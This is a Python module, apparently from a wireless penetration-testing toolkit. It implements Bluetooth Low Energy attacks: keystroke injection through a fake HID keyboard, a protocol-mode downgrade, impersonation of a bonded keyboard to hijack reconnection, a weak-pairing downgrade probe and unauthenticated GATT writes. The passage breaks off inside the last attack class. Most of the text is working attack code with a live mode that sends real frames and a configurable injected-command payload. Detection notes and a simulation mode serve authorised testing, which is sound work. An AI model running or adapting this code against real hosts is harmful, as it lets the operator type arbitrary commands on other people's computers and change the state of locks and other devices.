"""The BLE wave: HID injection, the downgrades around it, and identity.

Bluetooth Low Energy is where the keyboards are now.  A BLE keyboard is not a cable with
a radio in it: it is a GATT server that *notifies* its host, and the host believes every
notification it receives on the HID service, because the service is the only thing it can
check.  That is what these attacks exercise:

* ``ble_hid`` — the whole path: advertise the HID service with a real report map, watch
  for the host that connects, deliver boot-protocol keystrokes as ATT notifications, and
  report what the host typed.  The reports are built by :func:`wifipilot.bt.hid_key_reports`
  and read back by :func:`wifipilot.bt.hid_decode_stream` — the same decoder an offline
  analysis of a capture uses, so the simulation and the analysis cannot disagree.
* ``ble_hid_audit`` — who accepts input, and who insists on a bond.  The audit does the
  reading: it connects to every device serving the HID service, reads the HID Information
  and the report map, and sends one harmless report to see whether the host takes it.
* ``ble_hid_boot`` — the protocol downgrade: writing the Protocol Mode characteristic
  back to ``0x00`` puts the host in boot protocol, the older and simpler transport.
* ``ble_hid_reconnect`` — the identity attack.  A host that remembers the *name and
  address* of the keyboard it bonded, and reconnects to that rather than to the key, will
  connect to whoever advertises as it — and the controller says exactly which hosts did.
* ``ble_smp_downgrade`` — the security-manager negotiation: what a device will settle for
  when a stranger offers Just Works and a seven-byte key.
* ``ble_gatt_hijack`` — an unauthenticated write to a control characteristic, verified by
  reading the value back: a write that cannot be confirmed is a claim, not a finding.
* ``ble_irk_resolve`` — follow a device through its rotating addresses.  The addresses are
  tested against the identity keys that leak, with the specification's AES derivation, so
  a match is arithmetic rather than a guess about a manufacturer id.
* ``ble_conn_param_hijack`` — a link-layer connection update the peer did not ask for, and
  whether the peer accepted being starved of radio time.

Every one of them runs against :mod:`wifipilot.blesim` in demo mode with real HCI commands
and real protocol bytes, and against a real controller live.
"""

from __future__ import annotations

import struct
from typing import Any, Dict, List, Sequence, Tuple

from .. import bt
from ..models import AccessPoint
from .base import AttackContext, AttackOutcome
from .btattacks import _BtLive

__all__ = ["ATTACKS", "META", "NAMES", "REGISTRY", "DEFAULT_HID_PAYLOAD", "PROTOCOL_MODE_UUID"]

#: the shell line an injected BLE keyboard types by default: it proves the injection and
#: changes nothing — the same payload the classic wave ships, so an operator who sets
#: ``hid_payload`` once gets it everywhere.  The newline is the Enter key, and a command
#: line that is never submitted has typed nothing.
DEFAULT_HID_PAYLOAD = "id\n"

#: the HID-over-GATT characteristics, named once so a report reads like the service it is
#: about rather than like a hex dump
_CHARACTERISTIC_NAMES: Dict[int, str] = {
    0x2A4A: "HID Information", 0x2A4B: "Report Map", 0x2A4C: "HID Control Point",
    0x2A4D: "Report", 0x2A4E: "Protocol Mode",
}

#: the HID-over-GATT characteristics the attacks need by number
PROTOCOL_MODE_UUID = 0x2A4E
REPORT_UUID = 0x2A4D
REPORT_MAP_UUID = 0x2A4B
HID_INFO_UUID = 0x2A4A

#: ATT operation codes the wave sends, named once so the frames read like the spec
ATT_READ_REQUEST = 0x0A
ATT_READ_RESPONSE = 0x0B
ATT_WRITE_REQUEST = 0x12
ATT_WRITE_COMMAND = 0x52
ATT_WRITE_RESPONSE = 0x13
ATT_READ_BY_TYPE_REQUEST = 0x08
ATT_READ_BY_TYPE_RESPONSE = 0x09
ATT_ERROR_RESPONSE = 0x01


def _floor() -> Any:
    """The simulated floor.  Imported lazily so a live run does not build the model."""
    from .. import blesim
    return blesim.ble()


class _LiveLink:
    """A link to a real device: the handle, and whether reports were accepted.

    A live run cannot see the peer's own counters — a real host does not report how many
    notifications it received — so this object carries the handle and nothing else.  That
    is the honest difference between a live run and a simulated one: the same commands go
    on air, and the acceptance is what the operator's target shows rather than what the
    tool claims about it.
    """

    def __init__(self, sock: Any, address: str = "", handle: int = 0x0040) -> None:
        self.sock = sock
        self.device = None
        self.address = address
        self.handle = int(handle or 0x0040)
        self.hid_reports: List[bytes] = []
        self.hid_refused = 0
        self.pairing_refused = 0
        self.writes = 0
        self.transcript: List[Dict[str, Any]] = []

    @property
    def hid_text(self) -> str:
        return ""

    def dies(self, reason: str) -> None:                  # the same interface the sim has
        self.transcript.append({"event": "dead", "reason": reason})


def _att_exchange(sock: Any, link: Any, body: bytes, timeout: float = 1.0
                  ) -> Tuple[bytes, Dict[str, Any]]:
    """Send one ATT PDU and read the peer's answer off the ACL it comes back on."""
    if sock is None or link is None or not body:
        return b"", {}
    try:
        answer = bt.hci_send(sock, bt.acl_packet(link.handle,
                                                 bt.l2cap_frame(0x0004, bytes(body))),
                             timeout=timeout)
    except Exception:                                             # pragma: no cover
        return b"", {}
    payload = (bt.parse_acl_packet(answer or b"").get("l2cap") or {}).get("payload") or b""
    return payload, bt.parse_att(payload)


def _att_read(sock: Any, link: Any, handle: int) -> Tuple[bytes, Dict[str, Any]]:
    """Read one attribute: the value if it answered, and the parsed response either way."""
    if not handle:
        return b"", {}
    payload, parsed = _att_exchange(sock, link, bytes([ATT_READ_REQUEST])
                                    + struct.pack("<H", int(handle)))
    if payload[:1] == bytes([ATT_READ_RESPONSE]):
        return payload[1:], parsed
    return b"", parsed


def _att_write(sock: Any, link: Any, handle: int, value: bytes,
               command: bool = False) -> Dict[str, Any]:
    """Write one attribute and report what the peer answered.

    A Write Request is answered — a Write Response or an Error Response — and a Write
    *Command* is not answered at all, which is why an attack that wants to know whether
    its write landed sends the request form and then reads the value back.
    """
    if not handle:
        return {"sent": False, "accepted": False, "error": "no handle"}
    opcode = ATT_WRITE_COMMAND if command else ATT_WRITE_REQUEST
    payload, parsed = _att_exchange(sock, link, bytes([opcode]) + struct.pack("<H", handle)
                                    + bytes(value))
    if command:
        return {"sent": True, "accepted": True, "error": "", "answer": ""}
    error = parsed.get("opcode") == ATT_ERROR_RESPONSE
    return {"sent": True,
            "accepted": (not error) and bool(payload[:1] == bytes([ATT_WRITE_RESPONSE])
                                             or parsed.get("opcode")),
            "error": parsed.get("error_text", "") or parsed.get("name", ""),
            "answer": payload.hex()[:32]}


def _enumerate(sock: Any, link: Any, uuid: int, first: int = 0x0001, last: int = 0xFFFF
               ) -> List[Dict[str, Any]]:
    """Read By Type: the handles a peer serves a characteristic on.

    An attribute table is discovered rather than assumed — a report characteristic is at
    whatever handle the peer put it at — and this is the operation every GATT client
    starts with, so the attacks here use it instead of hard-coding a number.
    """
    entries: List[Dict[str, Any]] = []
    if sock is None or link is None:
        return entries
    payload, parsed = _att_exchange(sock, link, bytes([ATT_READ_BY_TYPE_REQUEST])
                                    + struct.pack("<HHH", int(first), int(last), int(uuid)))
    if payload[:1] != bytes([ATT_READ_BY_TYPE_RESPONSE]):
        return entries
    for entry in parsed.get("entries") or []:
        handle = int(entry.get("handle") or 0)
        if handle:
            entries.append({"handle": handle, "uuid": int(uuid)})
    return entries


class _BleAttack(_BtLive):
    """Shared plumbing for the BLE wave: a role, a socket, a link and a uniform report."""

    domain = "bluetooth"
    category = "rogue"
    noise = "moderate"
    impact = "loot"
    finding_severity = "high"

    def applies(self, ap: AccessPoint) -> bool:
        return True

    def payload(self, ctx: AttackContext) -> str:
        return str(getattr(ctx.config, "hid_payload", "") or DEFAULT_HID_PAYLOAD)

    # -- the link ------------------------------------------------------------ #

    def link(self, ctx: AttackContext, sock: Any) -> Any:
        """The link this run talks over: the simulation's, or a live handle.

        In demo mode the socket already owns a link to the device the run was aimed at,
        and using *that* one is what keeps the report and the transcript about the same
        device: a run that opens a second link writes to a handle nobody reads.
        """
        controller = getattr(sock, "controller", None)
        if controller is not None and getattr(controller, "link", None) is not None:
            return controller.link
        if getattr(ctx, "demo", False):
            from .. import blesim
            device = self.sim_device(ctx)
            return blesim.ble().open_link(device, 0x0040) if device is not None else None
        return _LiveLink(sock, self.target(ctx), self.live_handle(ctx, sock))

    def live_handle(self, ctx: AttackContext, sock: Any) -> int:
        """The connection handle from the LE connection complete event, live only."""
        if sock is None or getattr(ctx, "demo", False):
            return 0x0040
        try:
            for event in bt.iter_hci_events(sock, seconds=1.0, limit=40):
                parameters = event.get("parameters") or {}
                handle = parameters.get("handle") or parameters.get("connection_handle")
                if handle:
                    return int(handle)
        except Exception:                                         # pragma: no cover
            pass
        return 0x0040

    def report_handle(self, ctx: AttackContext, sock: Any, link: Any) -> int:
        """Where the peer serves its HID Report characteristic: enumerate, then read."""
        for entry in _enumerate(sock, link, REPORT_UUID):
            return int(entry["handle"])
        device = self.sim_device(ctx)
        if device is not None:
            from .. import blesim
            handles = blesim.ble().hid_handles(device)
            if handles:
                return int(handles[0])
        return 0

    def characteristic(self, ctx: AttackContext, uuid: int) -> int:
        """A characteristic's handle out of the simulated device's own table."""
        device = self.sim_device(ctx)
        if device is None:
            return 0
        for row in device.gatt_rows():
            if int(row.get("uuid") or 0) == int(uuid):
                return int(row["handle"])
        return 0

    # -- the injection ------------------------------------------------------- #

    def deliver(self, ctx: AttackContext, sock: Any, link: Any, handle: int,
                reports: Sequence[bytes], payload: str) -> Dict[str, Any]:
        """Send keystrokes and read back what the host made of them.

        In demo mode the simulated host records every report it accepted and decodes it
        with the toolkit's own decoder, so ``typed`` is what the host *would* have typed;
        live, the reports go on air and the counting is the controller's.
        """
        sent = 0
        if link is not None and handle:
            for report in reports:
                frame = bt.hid_input_report(report, handle) if handle else b""
                if not frame or sock is None:
                    break
                try:
                    bt.hci_send(sock, bt.acl_packet(link.handle, frame), timeout=0.6)
                    sent += 1
                except Exception:                                 # pragma: no cover
                    break
        accepted = sent
        refused = 0
        typed = ""
        if link is not None and getattr(link, "hid_reports", None) is not None:
            typed = link.hid_text
            accepted = len(link.hid_reports)
            refused = int(getattr(link, "hid_refused", 0))
        _presses, untypable = bt.hid_type_plan(payload)
        return {"sent": sent, "accepted": accepted, "refused": refused, "typed": typed,
                "payload": payload, "reports": len(reports),
                "keystrokes": len(reports) // 2, "untypable": untypable}


# --------------------------------------------------------------------------- #
# 1. the injection
# --------------------------------------------------------------------------- #


class BleHidAttack(_BleAttack):
    """BLE HID injection: advertise a keyboard, and type on whoever connects.

    The LE version of keystroke injection, and the harder one to notice: a host that has
    ever paired a keyboard subscribes to the HID report characteristic of the peripheral
    it is talking to, and everything that peripheral notifies it with *is* keystrokes —
    eight-byte boot reports, one per key, in the order a human types.

    The attack runs the protocol instead of describing it: it builds the HID service's
    advertising payload and asks the controller to advertise it, opens the LE link,
    enumerates the peer's report characteristic over ATT, and delivers the payload as
    Handle Value Notifications.  The reports are decoded by the same decoder the capture
    analysis uses, so the finding names what the host would have run.
    """

    name = "ble_hid"
    role = "hid"
    label = "BLE HID injection (keyboard over GATT)"
    category = "rogue"
    noise = "moderate"
    impact = "loot"
    finding_severity = "high"
    tool = "wifipilot bt.py (LE advertising + ATT notifications)"

    description = (
        "Advertise the HID-over-GATT service with a boot-keyboard report map, connect to "
        "the host that answers, enumerate its Report characteristic and deliver the payload "
        "as eight-byte input reports — one per keystroke, in the order a human types.  The "
        "payload defaults to 'id' followed by Enter (set hid_payload to change it), and "
        "the finding is that the host took the input.")
    detection = (
        "A new HID peripheral in the host's Bluetooth settings, and keystrokes nobody "
        "typed: the host's own log carries the connection, the service discovery and the "
        "input reports, and a keyboard the user never paired stays in the device list for "
        "as long as the bond is kept.")
    devices = ("bt_keyboard",)

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        payload = self.payload(ctx)
        reports = bt.hid_key_reports(payload)
        target = self.target(ctx)
        sock = self.socket(ctx)
        link = self.link(ctx, sock)
        extra: Dict[str, Any] = {
            "target": target, "payload": payload, "reports": len(reports),
            "profile": "HID over GATT (0x1812), boot keyboard reports",
            "advertised_service": "0x1812",
            "report_map_bytes": len(bt.HID_KEYBOARD_REPORT_MAP),
            "hid_characteristics": {f"0x{uuid:04x}": _CHARACTERISTIC_NAMES[uuid]
                                    for uuid in (HID_INFO_UUID, REPORT_MAP_UUID,
                                                 REPORT_UUID, PROTOCOL_MODE_UUID)}}
        if sock is not None:
            # the keyboard announces itself the way a keyboard does: the HID service, a
            # name the host will show its user, and connectable advertising
            advertising = bt.adv_payload(
                bt.ad_flags(le_general=True),
                bt.ad_service_uuids([bt.HID_SERVICE_UUID]),
                bt.ad_name(f"WF-KEYBOARD-{(target or 'WF')[-2:]}"),
                bt.ad_manufacturer(0x0006, b"\x01\x02"))
            bt.hci_send(sock, bt.le_set_advertising_data(advertising), timeout=1.0)
            bt.hci_send(sock, bt.le_set_advertising_parameters(interval_min_ms=100.0,
                                                               interval_max_ms=100.0,
                                                               adv_type=0x00), timeout=1.0)
            bt.hci_send(sock, bt.le_set_advertising_enable(True), timeout=1.0)
            if target:
                bt.hci_send(sock, bt.le_create_connection(target), timeout=1.0)
        handle = self.report_handle(ctx, sock, link)
        extra["report_handle"] = f"0x{handle:04x}" if handle else ""
        delivery = self.deliver(ctx, sock, link, handle, reports, payload)
        extra.update(delivery)
        if delivery.get("accepted") and not delivery.get("typed"):
            extra["note"] = ("the reports went on air: what the host typed is only visible "
                             "where the injection lands, so the finding is the acceptance "
                             "itself")
        if delivery.get("untypable"):
            # a payload the keyboard cannot spell is a payload the target never runs, and
            # saying so is the difference between a finding and a hope
            extra["warning"] = (f"{len(delivery['untypable'])} character(s) of the payload "
                                f"have no key on a boot keyboard and were not typed: "
                                f"{''.join(delivery['untypable'])!r}")
        detail_accepted = int(delivery.get("accepted") or 0)
        typed = delivery.get("typed") or ""
        if detail_accepted:
            title = f"BLE HID input accepted by {target or 'the host'}"
            detail = (f"{detail_accepted} of {delivery.get('sent')} report(s) accepted"
                      + (f"; the host typed {typed!r}" if typed else "")
                      + f" — payload {payload!r} delivered over the HID Report "
                        f"characteristic at {extra['report_handle'] or 'the enumerated handle'}")
            return self._report(ctx, ap, attempt, title, detail, extra, severity="high")
        if delivery.get("refused"):
            title = f"BLE HID input refused by {target}"
            detail = (f"{delivery['refused']} report(s) refused: the host takes HID input "
                      f"only over a bonded, encrypted link, which is what "
                      f"{target} requires")
            return self._report(ctx, ap, attempt, title, detail, extra, severity="info")
        return self._report(ctx, ap, attempt, "BLE HID: no host accepted input",
                            f"the keyboard advertised but nothing delivered input to "
                            f"{target or 'any host'}", extra, severity="info")


# --------------------------------------------------------------------------- #
# 2. who accepts input at all
# --------------------------------------------------------------------------- #


class BleHidAuditAttack(_BleAttack):
    """Which devices take HID input without a bond — the survey that sizes the wave.

    A keyboard injection is only interesting if somebody accepts the keyboard, so this is
    the audit that decides how much of the room is exposed: scan for the devices serving
    the HID service, connect to each, read the HID Information characteristic and the
    report map that says what kind of human interface it is, and send one report that
    presses nothing to see whether the host takes input at all.  A host that refuses is a
    good result, and is reported as one.
    """

    name = "ble_hid_audit"
    role = "hid"
    label = "BLE HID exposure audit (who accepts input)"
    category = "survey"
    noise = "quiet"
    impact = "info"
    finding_severity = "medium"
    tool = "wifipilot bt.py (LE scan + ATT reads)"

    description = (
        "Enumerate the devices on air that serve the HID-over-GATT service, read each one's "
        "HID Information and report map over ATT, and send a single report that presses no "
        "key to find out whether the host accepts HID input without a bond.  The output is "
        "the list of hosts a keystroke injection would reach.")
    detection = (
        "One LE connection per HID-serving device and an ATT read of the HID service: no "
        "keystroke is sent, so a host that watches its own connections sees the enumeration "
        "rather than the injection.")
    devices = ("bt_keyboard", "bt_headset", "fitness_tracker")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        seconds = self.seconds(ctx, 3.0)
        rows: List[Dict[str, Any]] = []
        if getattr(ctx, "demo", False):
            from .. import blesim
            airspace = _floor()
            for device in airspace.candidates("hid"):
                address = device.address
                link = airspace.link_for(address, "hid")
                sock = blesim.controller_socket(None, address=address, role="hid")
                handles = airspace.hid_handles(device)
                row: Dict[str, Any] = {
                    "address": address, "name": device.name, "profile": device.profile,
                    "model": device.model, "report_handle":
                        f"0x{handles[0]:04x}" if handles else ""}
                info_handle = next((row_["handle"] for row_ in device.gatt_rows()
                                    if int(row_.get("uuid") or 0) == HID_INFO_UUID), 0)
                map_handle = next((row_["handle"] for row_ in device.gatt_rows()
                                   if int(row_.get("uuid") or 0) == REPORT_MAP_UUID), 0)
                info, parsed = _att_read(sock, link, info_handle)
                row["hid_information"] = info.hex() or parsed.get("error_text", "")
                report_map, parsed_map = _att_read(sock, link, map_handle)
                row["report_map_bytes"] = len(report_map)
                row["report_map_note"] = ("boot keyboard" if report_map[:5] ==
                                          bt.HID_KEYBOARD_REPORT_MAP[:5] else
                                          parsed_map.get("error_text", ""))
                before = len(link.hid_reports) if link is not None else 0
                # one report that presses nothing: an accepted report is an open door and
                # a keyless report changes nothing on the host
                self.deliver(ctx, sock, link, handles[0] if handles else 0,
                             [bt.hid_boot_report(0, [])], "")
                row["accepts_input"] = bool(link is not None
                                            and len(link.hid_reports) > before)
                row["refused"] = bool(link is not None and link.hid_refused)
                rows.append(row)
        else:
            sock = self.socket(ctx)
            for event in bt.iter_hci_events(sock, seconds=seconds, limit=2000):
                for report in event.get("reports") or []:
                    if any(bt.HID_SERVICE_UUID in (entry.get("uuids") or [])
                           for entry in report.get("ad") or []):
                        rows.append({"address": report.get("address", ""),
                                     "name": report.get("name", ""), "accepts_input": None})
        hosts = [row for row in rows if row.get("accepts_input")]
        detail = (f"{len(rows)} HID host(s) on air, {len(hosts)} accept input without a "
                  f"bond: " + ", ".join(row["address"] for row in hosts[:6])
                  if rows else "no device serving the HID service answered")
        payload = {"hosts": rows, "exposed": len(hosts), "seconds": seconds,
                   "simulated": bool(getattr(ctx, "demo", False))}
        return self._report(ctx, ap, attempt,
                            f"BLE HID hosts: {len(rows)} ({len(hosts)} exposed)", detail,
                            payload, severity="medium" if hosts else "info")


# --------------------------------------------------------------------------- #
# 3. the protocol downgrade
# --------------------------------------------------------------------------- #


class BleHidBootAttack(_BleAttack):
    """Boot protocol: write the host back to the simpler HID transport.

    A HID host runs in one of two protocols.  *Report* protocol means the host parses the
    report map and understands vendor-defined reports; *boot* protocol is the fixed
    eight-byte keyboard format that BIOSes and bootloaders understand, and it is the one
    nothing authenticates.  Writing the Protocol Mode characteristic to ``0x00`` is
    therefore both a downgrade and the way an attacker stops needing to understand the
    device's own descriptor — and whether the write landed is visible in the value read
    back.
    """

    name = "ble_hid_boot"
    role = "hid"
    label = "BLE HID boot-protocol downgrade"
    category = "rogue"
    noise = "moderate"
    impact = "loot"
    finding_severity = "medium"
    tool = "wifipilot bt.py (ATT write to the HID Protocol Mode characteristic)"

    description = (
        "Write the HID Protocol Mode characteristic to 0x00 (boot protocol), read it back "
        "to prove the write landed, and then deliver the payload as boot reports — the "
        "transport a host takes without parsing the report map, and the one that carries "
        "keystrokes a firmware screen would accept.")
    detection = (
        "An ATT write to the HID service of the host, from a peripheral it has not paired "
        "with: a host that logs its GATT writes shows the protocol change and the boot "
        "reports that follow it.")
    devices = ("bt_keyboard",)

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        target = self.target(ctx)
        sock = self.socket(ctx)
        link = self.link(ctx, sock)
        mode_handle = self.characteristic(ctx, PROTOCOL_MODE_UUID)
        if not mode_handle:
            entries = _enumerate(sock, link, PROTOCOL_MODE_UUID)
            mode_handle = int(entries[0]["handle"]) if entries else 0
        before, _parsed = _att_read(sock, link, mode_handle)
        write = _att_write(sock, link, mode_handle, b"\x00")
        after, _parsed_after = _att_read(sock, link, mode_handle)
        downgraded = bool(write.get("accepted")) and after[:1] == b"\x00"
        extra: Dict[str, Any] = {
            "target": target, "protocol_mode_handle": f"0x{mode_handle:04x}"
            if mode_handle else "",
            "mode_before": before.hex(), "mode_after": after.hex(), "write": write,
            "downgraded": downgraded,
            "protocol": "boot (0x00)" if downgraded else "report (0x01)",
            "simulated": bool(getattr(ctx, "demo", False))}
        if not downgraded:
            reason = write.get("error") or ("the characteristic refused the write" if write
                                            else "no Protocol Mode characteristic")
            return self._report(ctx, ap, attempt,
                                f"BLE HID downgrade refused by {target or 'the host'}",
                                f"{reason}: {target or 'the host'} keeps its protocol mode, "
                                f"which is what a host that checks its writers does",
                                extra, severity="info")
        delivery = self.deliver(ctx, sock, link, self.report_handle(ctx, sock, link),
                               bt.hid_key_reports(self.payload(ctx)), self.payload(ctx))
        extra.update(delivery)
        detail = (f"protocol mode written to 0x00 and read back from {target}: the host is "
                  f"in boot protocol")
        if delivery.get("accepted"):
            detail += (f"; {delivery['accepted']} boot report(s) accepted"
                       + (f", the host typed {delivery['typed']!r}"
                          if delivery.get("typed") else ""))
        else:
            detail += "; the reports were not accepted, so the downgrade stands alone"
        return self._report(ctx, ap, attempt, f"BLE HID protocol downgraded on {target}",
                            detail, extra, severity="high" if delivery.get("accepted")
                            else "medium")


# --------------------------------------------------------------------------- #
# 4. the identity attack
# --------------------------------------------------------------------------- #


class BleHidReconnectAttack(_BleAttack):
    """Reconnect hijack: advertise as the keyboard the host already trusts.

    A bond is supposed to be a secret, and on many hosts the *decision* to reconnect is
    not: the host remembers the name and the address of the keyboard it bonded and
    reconnects to whatever advertises with those, leaving the link key to be checked later
    or not at all.  The attack copies that identity — the name in the advertising data, the
    address through ``LE Set Random Address`` — and counts the hosts that come to it.  A
    host that verifies the peer needs the key and does not connect, which is the negative
    half of the same demonstration.
    """

    name = "ble_hid_reconnect"
    role = "hid"
    label = "BLE reconnect hijack (impersonate the bonded keyboard)"
    category = "rogue"
    noise = "moderate"
    impact = "loot"
    finding_severity = "high"
    tool = "wifipilot bt.py (LE Set Random Address + advertising)"

    description = (
        "Advertise under the identity of the peripheral a host is already bonded to — its "
        "name and its address — and count the hosts that reconnect to it.  A host that "
        "trusts the name and the address without checking the link key hands the attacker "
        "the same link it would have given the real keyboard, and the injection follows.")
    detection = (
        "Two devices with the same Bluetooth name and address on air, and a host that "
        "connects to the second one: the host's device list shows the duplicate, and a "
        "passive receiver sees one address on two transmitters.")
    devices = ("bt_keyboard",)

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        sock = self.socket(ctx)
        from .. import blesim

        airspace = _floor() if getattr(ctx, "demo", False) else None
        bonded = [device for device in (airspace.devices if airspace else [])
                  if getattr(device, "bond_peer", "")]
        peer = bonded[0].bond_peer if bonded else "WF-KEYBOARD"
        peer_address = bonded[0].bond_address if bonded else "5c:11:22:33:44:aa"
        advertising = bt.adv_payload(
            bt.ad_flags(le_general=True),
            bt.ad_service_uuids([bt.HID_SERVICE_UUID]),
            bt.ad_name(peer))
        if sock is not None:
            bt.hci_send(sock, bt.le_set_advertising_data(advertising), timeout=1.0)
            bt.hci_send(sock, bt.le_set_random_address(peer_address), timeout=1.0)
            bt.hci_send(sock, bt.le_set_advertising_enable(True), timeout=1.0)
        controller = getattr(sock, "controller", None)
        reconnected: List[Dict[str, Any]] = []
        refused: List[Dict[str, Any]] = []
        if controller is not None:
            reconnected = [dict(entry) for entry in
                           getattr(controller, "reconnected", [])]
            refused = [dict(entry) for entry in
                       getattr(controller, "reconnect_refused", [])]
            for entry in reconnected:
                # a host that came to us gets the keystrokes: the hijacked link is the
                # peripheral's own, which is the whole point of the impersonation
                if airspace is None:
                    continue
                device = airspace.by_address(entry["host"])
                link = airspace.link_for(entry["host"], "hid")
                handles = airspace.hid_handles(device) if device is not None else []
                entry["delivery"] = self.deliver(
                    ctx, blesim.controller_socket(None, address=entry["host"], role="hid"),
                    link, handles[0] if handles else 0,
                    bt.hid_key_reports(self.payload(ctx)), self.payload(ctx))
        typed = [entry["delivery"].get("typed") or "" for entry in reconnected
                 if entry.get("delivery")]
        typed = [text for text in typed if text]
        if reconnected:
            title = f"BLE reconnect hijack: {len(reconnected)} host(s) reconnected"
            detail = (f"advertised as {peer} ({peer_address}): "
                      f"{', '.join(entry['host'] for entry in reconnected[:6])} reconnected"
                      + (f" and typed {typed[0]!r}" if typed else "")
                      + (f"; {len(refused)} host(s) verified the link key and stayed away"
                         if refused else ""))
        else:
            title = "BLE reconnect hijack: nobody reconnected"
            detail = (f"advertised as {peer} ({peer_address}) and "
                      f"{len(refused)} host(s) verified the link key instead of connecting, "
                      f"which is what a host that checks the peer does")
        payload = {"identity": {"name": peer, "address": peer_address},
                   "reconnected": reconnected, "refused": refused,
                   "payload": self.payload(ctx),
                   "simulated": bool(getattr(ctx, "demo", False))}
        return self._report(ctx, ap, attempt, title, detail, payload,
                            severity="high" if reconnected else "info")


# --------------------------------------------------------------------------- #
# 5. the pairing negotiation
# --------------------------------------------------------------------------- #


class BleSmpDowngradeAttack(_BleAttack):
    """LE pairing downgrade: what the peer settles for when nobody asks for protection.

    Pairing is a negotiation, and the initiator names what it is willing to do: bonding,
    man-in-the-middle protection, Secure Connections, and the largest key size it wants.  A
    device that *supports* protected pairing does not always *require* it, so a stranger
    offering Just Works with a seven-byte key gets an answer that says so — and that answer
    is the finding, because it is the difference between a session whose key nobody can
    touch and one whose key space a laptop walks in a second.

    The probe sends a real Pairing Request over SMP (L2CAP channel 0x0006), reads the
    response or the Pairing Failed, and reports the key size that was negotiated, which is
    the number that matters.
    """

    name = "ble_smp_downgrade"
    role = "smp"
    label = "LE pairing downgrade probe (Just Works + 7-byte key)"
    category = "rogue"
    noise = "moderate"
    impact = "loot"
    finding_severity = "high"
    tool = "wifipilot bt.py (SMP Pairing Request over L2CAP)"

    description = (
        "Send a Pairing Request that offers the weakest security the specification allows — "
        "no MITM protection, no Secure Connections, a seven-byte key — to every pairable "
        "device the controller can hear, and read the answer: a Pairing Response means the "
        "device agreed to the downgrade and the response carries the key size it settled "
        "for, a Pairing Failed means it refused.")
    detection = (
        "A Pairing Request with the MITM and Secure Connections bits clear: a host that "
        "logs pairing shows the attempt, and the device's own menu shows a pairing the user "
        "never accepted.")
    devices = ("bt_keyboard", "bt_headset", "fitness_tracker", "ble_sensor", "bt_lock")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        request = bt.smp_pairing_request(auth=0x00, key_size=7)
        rows: List[Dict[str, Any]] = []
        from .. import blesim

        if getattr(ctx, "demo", False):
            airspace = _floor()
            # every pairable device is offered the weak parameters, not just the twelve
            # weakest: the *refusals* are the half of the report an operator wants, and
            # they only appear if the probe reaches the devices that check
            for device in airspace.candidates("smp"):
                address = device.address
                sock = blesim.controller_socket(None, address=address, role="smp")
                link = getattr(getattr(sock, "controller", None), "link", None)
                payload = b""
                if sock is not None and link is not None:
                    answer = bt.hci_send(sock, bt.acl_packet(link.handle,
                                                             bt.l2cap_frame(0x0006, request)),
                                         timeout=0.6)
                    payload = (bt.parse_acl_packet(answer or b"").get("l2cap")
                               or {}).get("payload") or b""
                parsed = bt.parse_smp(payload)
                accepted = parsed.get("command") == 0x02
                rows.append({"address": address, "name": device.name,
                             "profile": device.profile, "answer": parsed.get("name", ""),
                             "reason": parsed.get("reason_text", ""),
                             "key_size": parsed.get("max_key_size"),
                             "secure_connections": parsed.get("secure_connections"),
                             "downgraded": accepted,
                             "refused": parsed.get("command") == 0x05})
        else:
            sock = self.socket(ctx)
            link = _LiveLink(sock, self.target(ctx))
            answer = bt.hci_send(sock, bt.acl_packet(link.handle, bt.l2cap_frame(0x0006,
                                                                                request)),
                                timeout=1.0)
            payload = (bt.parse_acl_packet(answer or b"").get("l2cap") or {}).get(
                "payload") or b""
            parsed = bt.parse_smp(payload)
            rows.append({"address": self.target(ctx), "answer": parsed.get("name", ""),
                         "key_size": parsed.get("max_key_size"),
                         "downgraded": parsed.get("command") == 0x02,
                         "refused": parsed.get("command") == 0x05})
        weak = [row for row in rows if row.get("downgraded")]
        refused = [row for row in rows if row.get("refused")]
        sizes = sorted({row.get("key_size") for row in weak if row.get("key_size")})
        detail = (f"{len(rows)} device(s) offered Just Works with a 7-byte key: "
                  f"{len(weak)} accepted"
                  + (f", negotiating {', '.join(str(size) for size in sizes)}-byte key(s)"
                     if sizes else "")
                  + (f"; {len(refused)} refused with "
                     f"{refused[0].get('reason') or 'a Pairing Failed'}, which is what a "
                     f"device that requires MITM or Secure Connections does"
                     if refused else ""))
        payload_out = {"devices": rows, "downgraded": len(weak), "refused": len(refused),
                       "key_sizes": sizes, "offered": {"auth": "0x00", "key_size": 7},
                       "request_hex": request.hex(),
                       "simulated": bool(getattr(ctx, "demo", False))}
        return self._report(ctx, ap, attempt,
                            f"LE pairing downgrade: {len(weak)} of {len(rows)} device(s) "
                            f"accepted", detail, payload_out,
                            severity="high" if weak else "info")


# --------------------------------------------------------------------------- #
# 6. the write nobody authenticated
# --------------------------------------------------------------------------- #


class BleGattHijackAttack(_BleAttack):
    """Unauthenticated GATT write: change a device's state, and prove it changed.

    The characteristic that carries a device's configuration is often writeable before the
    link is authenticated — sometimes before it is encrypted — and a write to it is a
    change to the device: a lock's bolt, a scooter's speed limit, a thermostat's setpoint,
    a PLC's calibration.  What makes this an attack rather than an audit is the ordering:
    enumerate, write, then *read the value back*, because an acknowledged write that cannot
    be confirmed is a claim about a device rather than a finding about one.
    """

    name = "ble_gatt_hijack"
    role = "gatt"
    label = "BLE GATT hijack (unauthenticated write, verified)"
    category = "exploit"
    noise = "quiet"
    impact = "loot"
    finding_severity = "high"
    tool = "wifipilot bt.py (ATT Read/Write)"

    description = (
        "Enumerate a BLE device's attribute table, pick a writeable control "
        "characteristic, write a new value to it and read it back to prove the device "
        "accepted the change without a bond.  The report names the characteristic, the "
        "value before and the value after, because 'the write was accepted' and 'the device "
        "changed' are two different findings.")
    detection = (
        "An ATT Write Request on a control characteristic from a host the device never "
        "bonded with, followed by a Read: the device's own log carries the write, and the "
        "physical device shows the effect.")
    devices = ("bt_lock", "ble_sensor", "fitness_tracker")

    #: what to write to a control characteristic: a value that is unmistakably the
    #: attacker's, so the read-back cannot be confused with a coincidental default
    MARKER = b"\x01"

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
